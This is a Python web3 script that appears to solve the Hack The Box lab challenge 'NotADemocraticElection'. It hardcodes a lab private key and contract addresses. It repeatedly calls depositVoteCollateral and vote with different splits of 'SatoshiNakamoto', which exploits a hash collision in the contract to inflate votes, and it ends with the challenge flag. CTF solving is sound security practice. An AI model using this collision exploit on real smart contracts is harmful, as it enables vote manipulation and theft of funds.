#https://www.neteye-blog.com/2024/07/ctf-exploit-not-a-democtratic-election/
#https://medium.com/@DeepakDSG/htb-notademocraticelection-48f15b482b7e

from web3 import Web3
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_utils import keccak

'''
Private key     :  0x67ec7b0ad9da8f05e429b7bc275848504787e1cc33f6c877648c2711a351633f
Address         :  0xb709696fA9977070760C0497fdA2818cc16C9EcD
Target contract :  0xD7268172745EE3926E3F24fe6133931c47FF1742
Setup contract  :  0xba09a7acD1afdEdAeaF986E134e6c79b7e6F7B99
'''

x = {
    "PrivateKey":    "0x67ec7b0ad9da8f05e429b7bc275848504787e1cc33f6c877648c2711a351633f",
    "Address":       "0xb709696fA9977070760C0497fdA2818cc16C9EcD",
    "TargetAddress": "0xD7268172745EE3926E3F24fe6133931c47FF1742",
    "setupAddress":  "0xba09a7acD1afdEdAeaF986E134e6c79b7e6F7B99"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://94.237.59.173:42877'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.8.25")

compiled = compile_files(["NotADemocraticElection.sol"], output_values=["abi"], solc_version="0.8.25")
abi = compiled['NotADemocraticElection.sol:NotADemocraticElection']['abi']
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

fullname = "SatoshiNakamoto"

for i in range(1, len(fullname), 1):
    name = fullname[:i]
    surname = fullname[i:]
    
    if name == "Satoshi":
        continue


    construct_txn = contract_instance2.functions.depositVoteCollateral(name, surname).build_transaction(
        {
            'from': account_from['address'],
            'nonce': w3.eth.get_transaction_count(account_from['address']),
            'chainId': w3.eth.chain_id,
        }
    )

    tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
    tx_hash = w3.eth.send_raw_transaction(tx_create.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

    construct_txn = contract_instance2.functions.vote(bytes("CIM","utf-8"), name, surname).build_transaction(
        {
            'from': account_from['address'],
            'nonce': w3.eth.get_transaction_count(account_from['address']),
            'chainId': w3.eth.chain_id,
        }
    )

    tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
    tx_hash = w3.eth.send_raw_transaction(tx_create.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

'''
compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.25")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
'''
#HTB{h4sh_c0ll1s10n_t0_br1ng_b4ck_d3m0cr4cy}
